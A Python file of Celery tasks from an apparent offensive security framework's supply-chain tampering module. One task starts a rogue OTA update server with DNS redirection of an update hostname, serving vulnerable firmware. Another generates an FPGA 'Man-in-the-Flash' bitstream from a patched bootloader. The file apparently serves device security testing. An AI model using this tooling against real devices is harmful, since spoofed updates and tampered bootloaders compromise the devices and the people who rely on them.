"""Celery tasks for supply chain tamper simulation (Module 10)."""

from celery import shared_task
from celery.utils.log import get_task_logger

logger = get_task_logger(__name__)


@shared_task(bind=True, max_retries=2)
def execute_rogue_ota(self, attack_id: str, device_id: str,
                      attack_vector: str, params: dict) -> dict:
    """Start rogue OTA server to serve vulnerable firmware."""
    logger.info("Starting rogue OTA server for device %s", device_id)
    from dragon_legion.modules.supply_chain import RogueOTAServer

    ota = RogueOTAServer(
        host=params.get("host", "0.0.0.0"),
        port=params.get("port", 80),
    )
    ota.set_firmware_dir(params.get("firmware_dir", "."))

    target_hostname = params.get("ota_hostname", "ota.google.com")
    ota.start_dns_redirect(target_hostname, params.get("redirect_ip", "127.0.0.1"))

    # Build OTA package if requested
    if params.get("build_package"):
        ota.build_ota_package(
            output_path=params.get("output", "vulnerable_ota.zip"),
            android_version=params.get("android_version", "10.0.0"),
        )

    return {
        "attack_id": attack_id,
        "status": "completed",
        "module": "supply_chain_ota",
        "hostname": target_hostname,
    }


@shared_task(bind=True, max_retries=1)
def execute_fpga_bitstream(self, attack_id: str, device_id: str,
                           attack_vector: str, params: dict) -> dict:
    """Generate FPGA flash emulator bitstream (Man-in-the-Flash)."""
    logger.info("Generating FPGA bitstream for device %s", device_id)
    from dragon_legion.modules.supply_chain import generate_fpga_bitstream

    patched_bl = bytes.fromhex(params.get("patched_bootloader", "00"))
    bitstream = generate_fpga_bitstream(
        patched_bl,
        target=params.get("fpga_target", "ice40"),
    )
    return {
        "attack_id": attack_id,
        "status": "completed",
        "module": "supply_chain_fpga",
        "bitstream_size": len(bitstream),
    }
